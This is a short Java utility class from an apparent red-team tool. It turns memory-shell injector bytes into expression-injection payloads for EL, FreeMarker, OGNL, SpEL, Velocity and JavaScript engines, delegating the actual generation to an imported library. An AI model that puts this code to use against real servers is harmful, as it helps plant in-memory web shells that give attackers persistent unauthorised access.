package com.potato.potatotool.content.redTeam.memshell.util;

import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import me.gv7.woodpecker.plugin.exprs.*;

/**
 * @author Potato
 * @date 2024/7/29 17:42
 */

// https://github.com/woodpecker-appstore/jexpr-encoder-utils
// From 观星_Java表达式语句生成器
public class JexprUtil {

    public static String[] generateExp(MemoryObj memoryObj) {
        byte[] injectorBytes = memoryObj.getInjectorBytes();
        String exprEncoder = memoryObj.getExprEncoder();

        switch (exprEncoder) {
            case "EL":
                return new ELExpr().genMemShell(injectorBytes);
            case "FreeMarker":
                return new FreeMarkerExpr().genMemShell(injectorBytes);
            case "OGNL":
                return new OGNLExpr().genMemShell(injectorBytes);
            case "SpEL":
                return new SpELExpr().genMemShell(injectorBytes);
            case "Velocity":
                return new VelocityExpr().genMemShell(injectorBytes);
            case "ScriptEngineManager(JS)":
                return new ScriptEngineManagerExpr().genMemShell(injectorBytes);
            default:
                return null;
        }
    }

}
